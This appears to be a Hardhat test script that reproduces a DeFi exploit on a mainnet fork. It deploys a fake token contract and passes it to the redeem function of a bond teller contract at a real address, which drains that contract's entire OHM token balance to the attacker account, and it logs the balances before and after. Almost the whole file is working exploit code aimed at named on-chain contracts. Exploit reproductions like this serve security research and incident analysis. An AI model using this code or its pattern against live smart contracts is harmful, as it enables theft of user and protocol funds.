import { ethers } from 'hardhat'
import { expect } from 'chai'
import { IERC20, FakeToken, IBondFixedExpiryTeller } from '../typechain-types'
import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'

describe('AttackContract Test', function () {
    this.timeout(150000)
    let fakeToren: FakeToken
    let OHM: IERC20
    let attacker: SignerWithAddress
    let BondFixedExpiryTeller: IBondFixedExpiryTeller

    before(async function () {
        // Get the deployer's signer object
        ;[attacker] = await ethers.getSigners()

        // Deploy the attacker contract
        const FakeToren = await ethers.getContractFactory('FakeToken')
        fakeToren = await FakeToren.deploy()
        OHM = await ethers.getContractAt('IERC20', '0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5')
        BondFixedExpiryTeller = await ethers.getContractAt(
            'IBondFixedExpiryTeller',
            '0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156',
        )
    })

    it('should block number equal to 15794363', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(15794363)
    })

    it('should get the balance of the attacker contract', async function () {
        console.log('Attacker OHM balance', await OHM.balanceOf(attacker.getAddress()))

        let ohmBalance = await OHM.balanceOf(BondFixedExpiryTeller)
        await BondFixedExpiryTeller.connect(attacker).redeem(fakeToren, ohmBalance)
        console.log('Redeeming...')
        console.log('Attacker OHM balance after attack', await OHM.balanceOf(attacker.getAddress()))
    })
})
